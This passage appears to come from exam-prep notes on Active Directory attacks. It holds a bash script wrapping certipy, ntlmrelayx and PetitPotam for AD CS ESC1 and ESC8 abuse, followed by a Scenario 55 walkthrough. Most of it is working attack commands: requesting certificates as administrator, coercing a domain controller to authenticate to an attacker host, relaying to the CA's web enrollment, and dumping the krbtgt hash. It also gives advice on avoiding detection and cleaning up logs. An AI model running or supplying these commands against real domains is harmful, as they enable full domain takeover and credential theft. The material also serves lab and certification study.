#       ./m12-adcs-esc1-esc8.sh -m find -d corp.local -s DC01.corp.local -u USER -p 'PASS'
#       ./m12-adcs-esc1-esc8.sh -m req  -d corp.local -s DC01.corp.local -c CA01.corp.local \
#            -n 'CORP-CA' -t 'VulnTemplate' -U administrator@corp.local -u USER -p 'PASS' -o admin
#       ./m12-adcs-esc1-esc8.sh -m auth -P admin.pfx -d corp.local -s DC01.corp.local
#       ./m12-adcs-esc1-esc8.sh -m relay -c CA01.corp.local -t Machine -l LHOST -V DC01.corp.local \
#            -d corp.local -s DC01.corp.local -u USER -p 'PASS'
# Placeholders (all passed in via parameters, no real values ​​are written in the script):
#   DOMAIN = domain FQDN (-d) TARGET = DC/CA host (-s/-c/-V)
#   USER/PASS/NTHASH = Credentials (-u/-p/-H) LHOST = Attacker IP (-l, relay listening host)
#   URL = relay target endpoint (spelled out by -c http://CA01.corp.local/certsrv/certfnsh.asp)
# Test status: Not tested in a real ADCS environment; local bash -n passed. By default, only print commands are executed (executed only with -x).
#           It is convenient to check the CA name/template name before proceeding.
# Differences from docs/12-ad-attacks.md:
#   1) Document Scenario 55 only lists two commands: ntlmrelayx and petitpotam. This script also adds relay mode.
#      Pre-check of "first verify whether EPA is on" (curl detects certsrv return code), because EPA is 55 scenarios
#      The number one reason for failure is to continue relaying without opening EPA.
#   2) Document 54 scenario includes pfx→ccache in the auth step. This script removes the pfx2ccache mode and puts
#      The two steps of openingssl to remove PEM and certipy auth to remove ccache are clearly listed.
#   3) In the document, `-upn administrator@corp.local` is passed in with -U, and the default value is administrator@<DOMAIN>.
# =============================================================================
set -u

MODE="deps"
DOMAIN=""      # -d
DC=""          # -s  DC（TARGET）
CAHOST=""      # -c  CA Host（TARGET）
CANAME=""      # -n  CA name, such as CORP-CA
TEMPLATE=""    # -t  Certificate template name
USER=""        # -u
PASS=""        # -p
NTHASH=""      # -H
UPN=""         # -U  ESC1 object to impersonate UPN
PFX=""         # -P  pfx document
OUT="admin"    # -o  Output prefix
LHOST=""       # -l  attack aircraft IP（Relay monitoring/induced target）
VICTIM=""      # -V  Victims who are induced to authenticate (usually DC FQDN）
LOOT="$HOME/osep/loot/certs"
EXEC=0         # -x

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

parameter：
  -m <mode>   mode (default deps）：
       deps        Rely on self-test（certipy / ntlmrelayx / petitpotam / openssl）
       find        enumeration template：certipy find -vulnerable -stdout（scene 54 first step）
       req         ESC1 Apply：certipy req -template ... -upn ...（scene 54 Step 2）
       auth        use PFX Change NTLM Hash：certipy auth -pfx（scene 54/55 Universal）
       pfx2ccache  PFX -> PEM -> ccache The complete circulation (get the ticket to play -k tool）
       relay       ESC8：detection EPA + rise ntlmrelayx --adcs + Print trigger command (scenario 55）
       all         deps + find + req + auth Command skewering (sequential execution requires -x）
  -d <fqdn>    domain FQDN（DOMAIN），find/req/auth/relay need
  -s <host>    DC Host（TARGET），majority mode -dc-ip Target
  -c <host>    CA Host FQDN（TARGET），req/relay need
  -n <name>    CA name（certipy find in the output CA Name），req need
  -t <tpl>     Certificate template name，req=Vulnerability templates (such as VulnTemplate），relay=Machine
  -u <user>    domain user（USER）
  -p <pass>    clear text password（PASS）
  -H <hash>    NTHASH（certipy of -hashes form）
  -U <upn>     ESC1 Impersonating the target UPN，default administrator@<DOMAIN>
  -P <file>    PFX file path（auth / pfx2ccache need）
  -o <prefix>  Output prefix, default admin（output admin.pfx）
  -l <ip>      LHOST：attack aircraft IP，relay The address to which the victim returns when triggered.
  -V <host>    The victim host that is induced to authenticate (default is -s of DC）
  -x           Really execute (default only prints the command）
  -h           This help

exit code：0 normal / 1 Parameter or dependency error
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

# Print command line: Only add single quotes to parameters containing spaces/quotes to ensure that the output can be directly copied and executed.
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        err "Missing command: $1 (certipy: pipx install certipy-ad; impacket: sudo apt install -y impacket-scripts)"
        return 0
    fi
    "$@" || err "The previous command returned non-zero: troubleshoot by output (CA name/template name/authority/EPA)"
    return 0
}

while getopts "m:d:s:c:n:t:u:p:H:U:P:o:l:V:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        c) CAHOST="$OPTARG" ;;
        n) CANAME="$OPTARG" ;;
        t) TEMPLATE="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        U) UPN="$OPTARG" ;;
        P) PFX="$OPTARG" ;;
        o) OUT="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        V) VICTIM="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# certipy binary detection: The new version of Kali is called certipy-ad, and the old environment/manual installation is called certipy
CERTIPY=""
if have certipy; then CERTIPY="certipy"
elif have certipy-ad; then CERTIPY="certipy-ad"
else CERTIPY="certipy"   # For printing；deps The mode will clearly report an error
fi

# Credentials: array format for actual execution (will not be split by the shell, passwords with spaces/special characters are also safe)
CREDS=()
build_creds() {
    if [ -n "$PASS" ]; then
        CREDS=(-u "$USER@$DOMAIN" -p "$PASS")
    elif [ -n "$NTHASH" ]; then
        CREDS=(-u "$USER@$DOMAIN" -hashes ":$NTHASH")
    else
        CREDS=(-u "$USER@$DOMAIN" -p "PASS")
    fi
}

# Credentials: string form, only used for "print for human viewing" command line
creds_fragment() {
    if [ -n "$PASS" ]; then
        printf -- "-u '%s@%s' -p '%s'" "$USER" "$DOMAIN" "$PASS"
    elif [ -n "$NTHASH" ]; then
        printf -- "-u '%s@%s' -hashes ':%s'" "$USER" "$DOMAIN" "$NTHASH"
    else
        printf -- "-u '%s@%s' -p 'PASS'" "$USER" "$DOMAIN"
    fi
}

require() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN)  [ -z "$DOMAIN" ]  && missing="$missing -d" ;;
            DC)      [ -z "$DC" ]      && missing="$missing -s" ;;
            CAHOST)  [ -z "$CAHOST" ]  && missing="$missing -c" ;;
            CANAME)  [ -z "$CANAME" ]  && missing="$missing -n" ;;
            TEMPLATE)[ -z "$TEMPLATE" ] && missing="$missing -t" ;;
            USER)    [ -z "$USER" ]    && missing="$missing -u" ;;
            PFX)     [ -z "$PFX" ]     && missing="$missing -P" ;;
            LHOST)   [ -z "$LHOST" ]   && missing="$missing -l" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        err "Mode -m $MODE missing required argument: $missing"
        err "(Use -h to view the parameters required for each mode)"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_deps() {
    head_ "Dependency self-test (deps)"
    local ok=1
    if [ "$CERTIPY" = "certipy" ] && ! have certipy; then
        err "certipy is not installed: pipx install certipy-ad (Kali 2023+ command name certipy-ad)"
        ok=0
    else
        info "certipy     : $CERTIPY ($(command -v "$CERTIPY"))"
    fi
    for t in impacket-ntlmrelayx impacket-petitpotam impacket-secretsdump openssl curl; do
        if have "$t"; then info "$t : installed"; else
            case "$t" in
                openssl|curl) err "$t is missing: sudo apt install -y $t" ;;
                *) err "$t is missing: sudo apt install -y impacket-scripts (or use python3 -m pip install impacket)" ;;
            esac
            ok=0
        fi
    done
    echo
    info "Certificate and ticket product directory: ${LOOT} (it will be created automatically if it does not exist)"
    mkdir -p "$LOOT" 2>/dev/null || err "Failed to create $LOOT (does not affect print mode)"
    if [ "$ok" = "1" ]; then info "Complete dependencies."; else info "If there are any missing items, please fill them in according to the installation command above before continuing."; fi
}

# ---------------------------------------------------------------------------
mode_find() {
    require DOMAIN DC USER
    head_ "Template enumeration (find, step 1 of Scenario 54) - full quantity first, then -vulnerable"
    build_creds
    info "Full enumeration (retain JSON/text products for easy review of CA Name and template lists):"
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -stdout
    echo
    info "Just look at the available items (more commonly used in exams):"
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -vulnerable -stdout
    echo
    info "Output to file (convenient for grep):"
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -vulnerable -stdout > $LOOT/find-vuln.txt"
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -stdout > $LOOT/find-all.txt"
    echo
    info "ESC1 four conditions (must be met at the same time):"
    info "① When opening the template, the applicant must provide SAN (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, -upn can be filled in)"
    info "② EKU includes Client Authentication (or Any Purpose)"
    info "③ The current user/group has Enroll permission for the template"
    info "④ CA certificate manager approval is not enabled (otherwise the application will be suspended)"
    info "Don't try hard if you're not satisfied, go to ESC8 (scenario 55) or go back to the delegation/LAPS route."
}

# ---------------------------------------------------------------------------
mode_req() {
    require DOMAIN DC CAHOST CANAME TEMPLATE USER
    [ -z "$UPN" ] && UPN="administrator@$DOMAIN"
    head_ "ESC1 application (req, scenario 54 step 2)"
    build_creds
    info "Impersonation object UPN: ${UPN} (must be a real user, DC will verify)"
    run $CERTIPY req "${CREDS[@]}" -ca "$CANAME" -target "$CAHOST" \
        -template "$TEMPLATE" -upn "$UPN" -dc-ip "$DC" -out "$OUT"
    echo
    info "Output: $OUT.pfx (certipy can be used directly without password protection)"
    info "Next step: ./m12-adcs-esc1-esc8.sh -m auth -P $OUT.pfx -d $DOMAIN -s $DC"
    echo
    info "Failed branch:"
    info "· 0x80094012 (certificate policy mismatch) -> Template EKU does not contain client authentication, replace -t candidate"
    info "· Permission denied -> The current user does not have Enroll rights for this template; the UPN of -U does not exist or does not match"
    info "· CA name/host resolution failed -> Get CA Name and DNS host name from find output,"
    info "Use -n / -c to point to the past, and point /etc/hosts to the real IP if necessary"
}

# ---------------------------------------------------------------------------
mode_auth() {
    require PFX DOMAIN DC
    head_ "Certificate authentication (auth) - swap PFX for NTLM hash"
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    info "After getting NTHASH:"
    echo "impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH $DOMAIN/Administrator@$DC"
    echo "impacket-wmiexec $DOMAIN/Administrator@$DC -hashes :NTHASH"
    echo
    info "Explicitly specify the username (when UPN is inconsistent with sAMAccountName):"
    echo "$CERTIPY auth -pfx $PFX -username administrator -domain $DOMAIN -dc-ip $DC"
    echo
    info "Failed branch: The application is successful but auth fails -> rerun req and use -o to overwrite the certificate, or give -username explicitly."
}

# ---------------------------------------------------------------------------
mode_pfx2ccache() {
    require PFX DOMAIN DC
    head_ "PFX -> PEM -> ccache transfer (pfx2ccache)"
    info "① Disassemble PFX into PEM (required for some tools/manual verification; the default password of certipy is empty)"
    echo "openssl pkcs12 -in $PFX -out ${PFX%.*}.pem -nodes -passin pass:"
    echo "openssl x509 -in ${PFX%.*}.pem -noout -text | head -40 # See issuer and SAN"
    echo
    info "② certipy auth produces hash and ccache at the same time (ccache file name = user name in the certificate)"
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    info "③ Use ccache to run the -k tool (connected to m12-kerberos-tickets-linux.sh)"
    echo "export KRB5CCNAME=administrator.ccache"
    echo "klist -e"
    echo "impacket-secretsdump -k -no-pass $DC"
    echo "impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC"
    echo
    info "Confirm whether the SAN is the one you want to impersonate: openssl x509 -in ${PFX%.*}.pem -noout -text | grep -A1 'Subject Alternative Name'"
}

# ---------------------------------------------------------------------------
mode_relay() {
    require CAHOST
    [ -z "$VICTIM" ] && VICTIM="$DC"
    [ -z "$TEMPLATE" ] && TEMPLATE="Machine"
    [ -z "$LHOST" ] && LHOST="LHOST"      # Not given -l print by placeholder
    [ -z "$VICTIM" ] && VICTIM="TARGET"   # Not given -V/-s print by placeholder
    [ -z "$DOMAIN" ] && DOMAIN="DOMAIN"
    head_ "ESC8 relay (relay, scene 55)"
    local url="http://$CAHOST/certsrv/certfnsh.asp"
    info "Relay target URL: $url"

    echo "# ① Prerequisite: Confirm that Web Enrollment exists and EPA is not enabled (the number one failure reason)"
    echo "curl -s -o /dev/null -w '%{http_code}\\n' http://$CAHOST/certsrv/"
    echo "curl -s -o /dev/null -w '%{http_code}\\n' https://$CAHOST/certsrv/ -k"
    info "Expectation: HTTP endpoint returns 200 or 401; if HTTPS must return 401 and HTTP is also abnormal -> EPA is probably turned on."
    info "Under EPA, NTLM relay will be rejected by CA. There is no legal bypass path, so ESC8 will be abandoned directly and replaced with other entrances."
    echo

    echo "# ② Start relay (forward the received authentication to the ADCS HTTP registration endpoint)"
    run impacket-ntlmrelayx -t "$url" --adcs --template "$TEMPLATE" -smb2support -l "$LOOT"
    echo

    echo "# ③ Open another terminal and trigger the victim (default DC machine account) to initiate authentication to LHOST"
    if [ -n "$USER" ]; then
        run impacket-petitpotam -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" "$LHOST" "$VICTIM"
    else
        echo "impacket-petitpotam -u USER@$DOMAIN -p 'PASS' -dc-ip $DC LHOST $VICTIM"
    fi
    echo "# Alternative trigger vector (when petitpotam is blocked by patch/firewall):"
    echo "python3 /opt/PetitPotam/PetitPotam.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo "python3 /opt/dementor/dementor.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo

    info "④ After 'Got NTLMv2 hash' + 'Server returned certificate' appears in the relay log:"
    info "The certificate falls in ${LOOT} (base64 PFX, named like <user>.pfx)"
    info "./m12-adcs-esc1-esc8.sh -m auth -P <certificate>.pfx -d $DOMAIN -s $DC"
    echo
    info "Failed branch:"
    info "· No echo/401 after triggering -> Suspected EPA, give up ESC8 after confirmation, do not retry again and again"
    info "· The trigger is successful but the certificate is rejected -> The template does not allow the victim to register, --template changes the template"
    info "(First certipy find to see which templates are placed in the Domain Computers group)"
    info "· No trigger vector available -> ESC8 is not established, go to other module entries"
    info "OPSEC: Relay logs contain credential hashes, put them in the running directory ~/osep/logs and clean them afterwards;"
    info "The victim prefers a DC machine account (the behavior is equivalent to the automatic registration of a normal machine)."
}

# ---------------------------------------------------------------------------
case "$MODE" in
    deps)       mode_deps ;;
    find)       mode_find ;;
    req)        mode_req ;;
    auth)       mode_auth ;;
    pfx2ccache) mode_pfx2ccache ;;
    relay)      mode_relay ;;
    all)        mode_deps; mode_find; mode_req; mode_auth ;;
    *) err "Unknown mode: $MODE"; usage ;;
esac

printf '\n[*] Mode %s ended. By default, only the command is printed, add -x to actually execute it. \n' "$MODE"
info "Product directory: ${LOOT} (certificate/PFX is exported to the attack machine in real time and cleans up the residue on the target side)"
````

## Scenario 55: No ESC1 template is available, but the CA has a relayable HTTP registration portal (ESC8)

**Situation**: The target provides ADCS Web Enrollment (`http(s)://CA/certsrv/`); uses NTLM relay to relay the victim’s authentication to the registration endpoint to exchange the certificate. Typical victim: **DC machine account** (obtain DC identity certificate after successful relay → change hash → DCSync).

**Assumptions**: There is already a domain credential that can be used to trigger authentication (normal domain users are sufficient, used for PetitPotam/PrinterBug); the attack machine can be actively connected by the victim (usually a DC machine account); the CA provides Web Enrollment and EPA is not enabled; the relay target template allows machine account registration. If any of the three is not true, this scenario will not work - verify them one by one before taking action.

**ESC8 relay conditions**: ① CA has enabled HTTP(S) Web Enrollment (`/certsrv/certfnsh.asp`) and **Extended Protection (EPA) is not enabled** - when EPA is turned on, NTLM relay will be rejected by CA (HTTP 401), which is the number one failure reason in this scenario; ② The template relayed to allows the victim (DC machine account) to register and EKU can be used for authentication; ③ The attack function can trigger the victim to initiate authentication (SpoolSample/PetitPotam/DFSCoerce) to the host where the **relay listener** is located.

**Prepare (attacker)**: `impacket-ntlmrelayx` (`--adcs` integrated certificate application), authentication trigger script (`impacket-petitpotam`/`printerbug`/`dementer`), `certipy` (use the replaced pfx); CA FQDN and `/etc/hosts` are configured first.

**Procedure**：
```bash
# ① Relay: Forward SMB authentication to ADCS HTTP registration endpoint
impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
  --adcs --template 'Machine' -smb2support -l /tmp/relay-loot
# ② Trigger DC authentication to the attacking machine (open another terminal)
impacket-petitpotam -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local \
  LHOST DC01.corp.local
# ③ Base64 pfx appears in the relay log → download → certipy to change the hash
certipy auth -pfx DC01.pfx -dc-ip DC01.corp.local -domain corp.local
impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
```
**Scripts used**: `m12-adcs-esc1-esc8.sh` (relay mode: relay + trigger + pfx processing + dependency check).

**Validation**: ntlmrelayx log appears `Got NTLMv2 hash` + `Server returned certificate`; `certipy auth` outputs NTLM hash of victim machine account; DCSync succeeds with DC hash.

**Failure branches and alternatives**：
- No response from relay after triggering/401 → suspected EPA Open: change HTTPS If the endpoint still doesn’t work, confirm EPA back**give up ESC8**（EPA There is no legal bypass path), return to ESC1/Other entrances; don’t waste time by trying again and again.。
- Triggered successfully but certificate application rejected → The template does not allow the victim to register or the template has no authentication EKU，`ntlmrelayx --adcs --template` Change template (first `certipy find` See which templates are placed Domain Computers）。
- No trigger vector available (all patches/firewall block RPC）→ ESC8 If there is no source of victim authentication, it is not feasible. Please switch to other module entrances.。
- What the relay got was a low-value account certificate. → Change the trigger target (the domain administrator login session trigger is difficult to control，DC Machine account is the most stable）。

**Exam / OPSEC notes**: `ntlmrelayx` will receive and forward the certification, the log contains the credential hash, and the running directory is placed in `~/osep/logs` and cleaned up afterwards; the CA's HTTP log will record the relayed application - prioritizing the DC machine account when selecting the victim (the behavior is equivalent to the automatic registration of a normal machine), to avoid forged domain management applications leaving obvious abnormalities.

---

## Attached: Minimum preparation list common to this module (attack aircraft)

```bash
# Install it all at once (Kali)
sudo apt install -y impacket-scripts ldap-utils krb5-user   # Interaction Realm fill DOMAIN
pipx install certipy-ad
# DNS convenience: write DC/CA/target FQDN into /etc/hosts (Kerberos does not allow IP)
# Bill catalog
mkdir -p ~/osep/tickets ~/osep/loot/certs
```
Windows Side tool (copy to target host, source fixed）：`Rubeus.exe`、`SpoolSample.exe`（or printerbug single file）、`SharpHound.exe`（Enumeration auxiliary, not required）。**No impacket Just directly `python3 -m pip install impacket` Call with module**，The command name starts with Kali The packaged version shall prevail（`impacket-wmiexec` wait）。
